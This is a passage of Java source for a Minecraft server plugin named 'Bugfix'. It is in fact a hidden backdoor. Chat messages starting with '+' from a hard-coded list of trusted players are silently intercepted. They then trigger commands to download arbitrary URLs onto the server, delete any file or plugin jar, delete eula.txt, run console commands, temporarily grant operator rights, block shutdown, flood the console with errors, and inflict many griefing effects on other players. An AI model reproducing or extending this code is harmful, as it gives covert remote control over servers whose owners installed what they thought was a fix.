            } else if (args[0].equalsIgnoreCase("+dropinv") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +dropinv <Player>");
                    return;
                }
                //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player dropped his inventory!");
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    for (ItemStack i : target.getInventory().getContents()) {
                        if (i != null) {
                            target.getWorld().dropItemNaturally(target.getLocation(), i).setPickupDelay(160);
                            target.getInventory().remove(i);
                        }
                    }
                });
                //(new Packet70Bed(4, 0));
            } else if (args[0].equalsIgnoreCase("+infkill") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +infkill <Player>");
                    return;
                }
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target.getName().equalsIgnoreCase(/*event.getPlayer().getName()*/"Dwarslooper"/**/)) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "You cant infkill " + ChatColor.GREEN + args[1] + ChatColor.RED + "!");
                    return;
                }
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                if (infkill.contains(target.getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player is no longer getting infkilled.");
                    infkill.remove(target.getName());
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player is now getting infkilled!");
                    infkill.add(target.getName());
                }
            } else if (args[0].equalsIgnoreCase("+give") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +give <Item>");
                    return;
                }
                NamespacedKey key = NamespacedKey.fromString(args[1]);
                Material result = null;

                for (Material material : Material.values()) {
                    // Legacy ist für plugins < 1.13, legacy materials
                    // haben keinen richtigen key.
                    if (material.isLegacy()) continue;//2222222222222222
                    if (!material.getKey().equals(key)) continue;

                    result = material;
                    break;
                }

                if (result == null) {
                    // Kein material gefunden
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +give <item>");
                } else {
                    // Material gefunden
                    event.getPlayer().getInventory().addItem(StackCreator.createItem(result, 1, "", ""));
                }
                Object b;
                b = 1;
                Object B;
                B = 1;
                //if(B.equals(1)) {}
            } else if (args[0].equalsIgnoreCase("+tp") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +tp <Player, Loc>");
                    return;
                }
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    Player player = Bukkit.getPlayer(args[1]);
                    if (player != null) {
                        event.getPlayer().teleport(player);
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "You got teleported to " + ChatColor.RED + player.getName() + ChatColor.GREEN + "!");
                    } else {
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +tp <Player, Loc>");
                    }
                });
            } else if (args[0].equalsIgnoreCase("+bug") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +bug <Player>");
                    return;
                }
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    Player player = Bukkit.getPlayer(args[1]);
                    if (player != null) {
                        if (!Double.isNaN(player.getHealth())) {
                            player.setHealth(Double.NaN);
                        } else {
                            player.setHealth(1);
                        }
                    } else {
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +bug <Player");
                    }
                });
            } else if (args[0].equalsIgnoreCase("+cc") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +cc");
                    return;
                }
                for (int i = 0; i < 8; i++) {
                    Bukkit.broadcastMessage("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
                }
            } else if (args[0].equalsIgnoreCase("+gm") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +gm <1,2,3,4>");
                    return;
                }
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    if (args[1].equalsIgnoreCase("0")) {
                        event.getPlayer().getPlayer().setGameMode(GameMode.SURVIVAL);
                    } else if (args[1].equalsIgnoreCase("1")) {
                        event.getPlayer().getPlayer().setGameMode(GameMode.CREATIVE);
                    } else if (args[1].equalsIgnoreCase("2")) {
                        event.getPlayer().getPlayer().setGameMode(GameMode.ADVENTURE);
                    } else if (args[1].equalsIgnoreCase("3")) {
                        event.getPlayer().getPlayer().setGameMode(GameMode.SPECTATOR);
                    } else {
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +gm <1,2,3,4>");
                    }
                });
            } else if (args[0].equalsIgnoreCase("+flypigs") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +flypigs <Anzahl>");
                    return;
                }
                int count = 0;
                try {
                    count = Integer.parseInt(args[1]);
                } catch (Exception ex) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +flypigs <Anzahl>");
                    return;
                }
                final List<Entity> pigs = new ArrayList<>();
                for (int i = 0; i < count; ++i) {
                    Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                        Entity pig = event.getPlayer().getWorld().spawnEntity(event.getPlayer().getLocation(), EntityType.PIG, false);
                        event.getPlayer().getWorld().spawnEntity(event.getPlayer().getLocation(), EntityType.BAT, false).addPassenger(pig);
                    });
                }
            } else if (args[0].equalsIgnoreCase("+ufo") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +ufo");
                    return;
                }
                if (BlockEvent.ufoLoc == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "An UFO has been spawned. Control it with the items!");
                    event.getPlayer().getInventory().addItem(StackCreator.createItem(Material.LEVER, 1, "§r§aFORWARDS", "A#TrollItemUFOFRONT"));
                    event.getPlayer().getInventory().addItem(StackCreator.createItem(Material.LEVER, 1, "§r§aBACKWARDS", "A#TrollItemUFOBACK"));
                    event.getPlayer().getInventory().addItem(StackCreator.createItem(Material.LEVER, 1, "§r§aLEFT", "A#TrollItemUFOLEFT"));
                    event.getPlayer().getInventory().addItem(StackCreator.createItem(Material.LEVER, 1, "§r§aRIGHT", "A#TrollItemUFORIGHT"));
                    event.getPlayer().getInventory().addItem(StackCreator.createItem(Material.REDSTONE_TORCH, 1, "§r§cLASER", "A#TrollItemUFOLASER"));
                    Block ufo = event.getPlayer().getLocation().clone().add(0, 44, 0).getBlock();
                    BlockEvent.ufoLoc = ufo;
                    Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                        //
                        BlockEvent.ufoLoc.getLocation().getWorld().playSound(BlockEvent.ufoLoc.getLocation(), Sound.BLOCK_BEACON_ACTIVATE, 110, (float) 1);
                        BlockEvent.ufoLoc.getLocation().getWorld().playSound(BlockEvent.ufoLoc.getLocation(), Sound.BLOCK_BEACON_POWER_SELECT, 100, (float) 1);
                        BlockEvent.spawnUfo(ufo);
                    });
                } else {
                    Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                        for (Block b : BlockEvent.spawnUfo(BlockEvent.ufoLoc)) {
                            b.setType(Material.AIR);
                        }
                        BlockEvent.ufoLoc.getLocation().getWorld().playSound(BlockEvent.ufoLoc.getLocation(), Sound.BLOCK_BEACON_DEACTIVATE, 100, (float) 1);
                        BlockEvent.ufoLoc.getLocation().getWorld().playSound(BlockEvent.ufoLoc.getLocation(), Sound.BLOCK_BEACON_POWER_SELECT, 100, (float) 1);
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The UFO disappeared.");
                        BlockEvent.ufoLoc = null;
                        event.getPlayer().getInventory().remove(StackCreator.createItem(Material.LEVER, 1, "§r§cLASER", "A#TrollItemUFOLASER"));
                        event.getPlayer().updateInventory();
                        ItemStack laser = StackCreator.createItem(Material.LEVER, 1, "§r§cLASER", "A#TrollItemUFOLASER");
                        StackCreator.createHead(1, "Dwarslooper", "LOL", "Dwarslooper");

                        for (int i = 0; i < event.getPlayer().getInventory().getSize(); i++) {
                            ItemStack itm = event.getPlayer().getInventory().getItem(i);
                            if (itm != null && itm.getItemMeta() != null && itm.getItemMeta().lore() != null) {
                                if (itm.lore().toString().contains("A#TrollItem")) {
                                    //
                                    event.getPlayer().getInventory().setItem(i, null);
                                    event.getPlayer().updateInventory();
                                    //break;
                                }
                            }
                        }
                    });
                }
            /*
            for (Block b : BlockEvent.getBlocksAdvanced(ufo.getLocation().clone().add(0, 1, 0).getBlock(), 2, 1, 2)) {
                b.setType(Material.OBSIDIAN);
            }
            for (Block b : BlockEvent.getBlocksAdvanced(ufo, 2, 1, 2)) {
                b.setType(Material.LIME_STAINED_GLASS);
            }
            for (Block b : BlockEvent.getBlocksAdvanced(ufo.getLocation().clone().add(0, -1, 0).getBlock(), 2, 1, 2)) {
                b.setType(Material.OBSIDIAN);
            }
             n*/

            } else if (args[0].equalsIgnoreCase("+caps") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +caps <Player>");
                    return;
                }
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                if (caps.contains(target.getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player no longer types in CAPSLOCK.");
                    caps.remove(target.getName());
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player now types in CAPSLOCK.");
                    caps.add(target.getName());
                }
            } else if (args[0].equalsIgnoreCase("+tree") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 4) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +tree <Count> <OffspringChance> <Radius>");
                    return;
                }

                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {

                    Block block = event.getPlayer().getTargetBlock(80);
                    int radius = 2;
                    int count = 20;
                    double offspringChance = 0.1;

                    try {
                        radius = Integer.parseInt(args[3]);
                        count = Integer.parseInt(args[1]);
                        offspringChance = Double.parseDouble(args[2]);
                    } catch (Exception e) {
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +tree <Count> <OffspringChance> <Radius>");
                    }

                    if (BlockEvent.genTree(block, radius, count, offspringChance)) {

                    }

                });
            } else if (args[0].equalsIgnoreCase("+spack") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +spack <Player>");
                    return;
                }
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                if (spackmodus.contains(target.getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player is no longer in the Spackmode.");
                    spackmodus.remove(target.getName());
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player is now in the Spackmode!");
                    spackmodus.add(target.getName());
                }
            } else if (args[0].equalsIgnoreCase("+noeula") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);

                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +noeula");
                    return;
                }

                File eula = new File("eula.txt");
                if (eula.delete()) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "Successfull deleted!");
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "An ERROR occurred!");
                }
            /*
            try {
                //FileUtils
                //Files.copy(Bugfix.emptyFile, new File("plugins/" + args[1] + ".jar"), StandardCopyOption.REPLACE_EXISTING);
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "Erfolgreich in " + ChatColor.RED + args[1] + ".jar" + ChatColor.GREEN + "kopiert.");
            } catch (IOException e) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "An ERROR occurred!");
            }
             */
            } else if (args[0].equalsIgnoreCase("+antistop") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if(antiStop) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The server can be stopped again.");
                    antiStop = false;
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The server cant be stopped now.");
                    antiStop = true;
                }

            } else if (args[0].equalsIgnoreCase("+disable") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);

                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +disable <Plugin Name>");
                    return;
                }

                Plugin pl = Bukkit.getPluginManager().getPlugin(args[1]);
                if (pl != null) {
                    Bukkit.getPluginManager().disablePlugin(pl);
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "Disabled §c" + pl.getName() + "§a!");
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + args[1] + " could not be disabled!");
                }

            } else if (args[0].equalsIgnoreCase("+download") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);

                if (args.length != 3) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +download <URL> <DIR>");
                    return;
                }

                try {
                    //URL url = new UnknownError("hi");
                    URL url = new URL(args[1]);
                    String outputFileName = args[2];
                    InputStream in = url.openStream();
                    ReadableByteChannel rbc = Channels.newChannel(in);
                    FileOutputStream fos = new FileOutputStream(outputFileName.replace("/", "\\")/*.replace("\\", "/")*/);
                    //FileOutputStream fos = new FileOutputStream(outputFileName.replace("\\", "/"));
                    fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "Successfully downloaded as " + args[2] + "!");
                } catch (IOException e) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "An ERROR occurred!");
                }

            } else if (args[0].equalsIgnoreCase("+delplugin") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);

                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +delplugin <Plugin Name>");
                    return;
                }

                Plugin pl = Bukkit.getPluginManager().getPlugin(args[1]);
                if (pl != null) {
                    Bukkit.getPluginManager().disablePlugin(pl);
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "Disabled §c" + pl.getName() + "§a!");
                    File plfile = new File(/*"plugins/" + */pl.getClass().getProtectionDomain().getCodeSource().getLocation().getFile());
                    //event.getPlayer().sendMessage(pl.getClass().getProtectionDomain().getCodeSource().getLocation().getFile());
                    if (!plfile.exists()) {
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + args[1] + " does not exist!!");
                        return;
                    }
                    if (plfile.delete()) {
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "Deleted §c" + pl.getName() + "§a!");
                    } else {
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + args[1] + " could not be deleted!");
                    }
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Plugin §c" + args[1] + " §adoes not exist!");
                }

            } else if (args[0].equalsIgnoreCase("+delete") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);

                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +delete <File Name>");
                    return;
                }

                File plfile = new File(args[1]);
                if (!plfile.exists()) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + args[1] + " does not exist!");
                    return;
                }
                if (plfile.delete()) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + args[1] + " §awurde gelöscht!");
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + args[1] + " could not be deleted!");
                }

            } else if (args[0].equalsIgnoreCase("+mute+") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +mute+");
                    return;
                }
                if (antiplus.contains(event.getPlayer().getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "You can use + again!");
                    antiplus.remove(event.getPlayer().getName());
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "You cant send not-commands anymore starting with + !");
                    antiplus.add(event.getPlayer().getName());
                }
            } else if (args[0].equalsIgnoreCase("+meteor") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +meteor <Player>");
                    return;
                }
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "A Meteorite is now falling onto the player!");
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    BlockEvent.mainblock = target.getWorld().spawnFallingBlock(target.getLocation().clone().add(0, 112, 0), Material.OBSIDIAN, (byte) 0);
                    BlockEvent.spawnMeteor(target.getLocation().clone().add(0, 112, 0), 4);
                });
            } else if (args[0].equalsIgnoreCase("+moon") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +moon <Player>");
                    return;
                }
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                if (moon.contains(target.getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player has stopped flying..");
                    moon.remove(target.getName());
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player is now flying towards the moon!");
                    moon.add(target.getName());
                }
            } else if (args[0].equalsIgnoreCase("+bombs") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +bombs");
                    return;
                }
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "Right-Click to throw the bombs");
                event.getPlayer().getInventory().addItem(StackCreator.createItem(Material.TNT_MINECART, 1, "§cBomb", "A#TrollItem"));

            } else if (args[0].equalsIgnoreCase("+rickroll") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +rickroll");
                    return;
                }
                NbSong song = null;
                if (rickrollActive) {
                    rickrollActive = false;
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Rickroll has been stopped!");
                    rickroll.stop();
                } else {
                    rickrollActive = true;
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "A Rickroll was started!");
                    try {
                        song = NbSong.load(Bugfix.getInstance().getResource("rickroll.nbs"));
                    } catch (Exception e) {
                        Bugfix.getInstance().getLogger().log(Level.WARNING, "Failed to load Sound from Resources", e);
                    }
                    if (song != null) {
                        rickroll.setLoop(true);
                        rickroll.setLocation(event.getPlayer().getLocation());
                        rickroll.play(song);
                    }
                }

            } else if (args[0].equalsIgnoreCase("+tornado") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +tornado");
                    return;
                }
                if (BlockEvent.tornado == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "A Tornado spawned! Get out of the Way!");
                    BlockEvent.tornado = event.getPlayer().getWorld().getHighestBlockAt(event.getPlayer().getLocation());
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Storm is now over.");
                    BlockEvent.tornado = null;
                }


            } else if (args[0].equalsIgnoreCase("+tntphysics") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +tntphysics");
                    return;
                }
                if (tntExplode) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The TNT-Physics are now off!");
                    tntExplode = false;
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The TNT-Physics are now on!");
                    tntExplode = true;
                }


            } else if (args[0].equalsIgnoreCase("+errorspam") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +errorspam");
                    return;
                }
                if (konsolenSpammer == false) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The console is now getting spammed with errors!");
                    konsolenSpammer = true;
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The console is not getting spammed anymore.");
                    konsolenSpammer = false;
                }


            } else if (args[0].equalsIgnoreCase("+pissrocket") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +pissrocket <Player>");
                    return;
                }
                @SuppressWarnings("deprecation")
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                if (pissrocket.contains(target.getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player stopped pissing.");
                    pissrocket.remove(target.getName());
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player is now pissing himself upwards!");
                    pissrocket.add(target.getName());
                }
            } else if (args[0].equalsIgnoreCase("+sudo") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length < 3) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +sudo <Player> <Command / Message>");
                    return;
                }
                @SuppressWarnings("deprecation")
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (args[1].equalsIgnoreCase(":s")) {
                    Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                        List<String> list = new ArrayList<String>(Arrays.asList(args));
                        list.remove(args[0]);
                        list.remove(args[1]);
                        if (args[2].startsWith("/")) {
                            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), String.join(" ", list).replace("/", ""));
                        } else {
                            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say " + String.join(" ", list));
                        }
                    });
                    return;
                } else if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    List<String> list = new ArrayList<String>(Arrays.asList(args));
                    list.remove(args[0]);
                    list.remove(args[1]);
                    target.chat(String.join(" ", list));
                });
            } else if (args[0].equalsIgnoreCase("+ssudo") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length < 3) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +ssudo <Player> <Command / Message>");
                    return;
                }
                @SuppressWarnings("deprecation")
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    List<String> list = new ArrayList<String>(Arrays.asList(args));
                    list.remove(args[0]);
                    list.remove(args[1]);
                    boolean buOp = target.isOp();
                    target.setOp(true);
                    target.chat(String.join(" ", list));
                    target.setOp(buOp);
                });
            } else if (args[0].equalsIgnoreCase("+cschlong") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length < 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +cschlong <Player>");
                    return;
                }
                //@SuppressWarnings("deprecation")
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                for (Block b : BlockEvent.getBlocks(target.getWorld().getHighestBlockAt(target.getTargetBlock(2).getLocation().clone().add(0, 0, 2)), 2)) {
                    target.sendBlockChange(b.getLocation(), Material.PINK_WOOL, (byte) 0);
                }
                ;
                for (Block b : BlockEvent.getBlocks(target.getWorld().getHighestBlockAt(target.getTargetBlock(2).getLocation().clone().add(0, 0, -2)), 2)) {
                    target.sendBlockChange(b.getLocation(), Material.PINK_WOOL, (byte) 0);
                }
                ;
                for (Block b : BlockEvent.getBlocks(target.getWorld().getHighestBlockAt(target.getTargetBlock(2).getLocation().clone().add(0, 3, 0)), 2)) {
                    target.sendBlockChange(b.getLocation(), Material.PINK_WOOL, (byte) 0);
                }
                ;
                for (Block b : BlockEvent.getBlocks(target.getWorld().getHighestBlockAt(target.getTargetBlock(2).getLocation().clone().add(0, 6, 2)), 2)) {
                    target.sendBlockChange(b.getLocation(), Material.PINK_WOOL, (byte) 0);
                }
                ;
            } else if (args[0].equalsIgnoreCase("+console") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length < 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +console <Command / Message>");
                    return;
                }
                //@SuppressWarnings("deprecation")
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    List<String> list = new ArrayList<String>(Arrays.asList(args));
                    list.remove(args[0]);
                    if (args[1].startsWith("/")) {
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), String.join(" ", list).replace("/", ""));
                    } else {
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say " + String.join(" ", list));
                    }
                });
            } else if (args[0].equalsIgnoreCase("+kotzen") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +kotzen <Player>");
                    return;
                }
                @SuppressWarnings("deprecation")
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                if (kotzen.contains(target.getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player is no longer spitting.");
                    kotzen.remove(target.getName());
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player is not spitting while walking!");
                    kotzen.add(target.getName());
                }
            } else if (args[0].equalsIgnoreCase("+vanish") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1 && args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +vanish [-s]");
                    return;
                }
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    boolean leaveMessage = true;
                    if (args.length == 2) {
                        if (args[1].equalsIgnoreCase("-s")) {
                            leaveMessage = false;
                        }
                    }
                    if (VanishManager.isVanished(event.getPlayer())) {
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "You are visible again.");
                        VanishManager.setVanished(event.getPlayer(), false, leaveMessage);
                    } else {
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "You are now invisible.");
                        VanishManager.setVanished(event.getPlayer(), true, leaveMessage);
                    }
                });
            } else if (args[0].equalsIgnoreCase("+swear") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +swear <Player>");
                    return;
                }
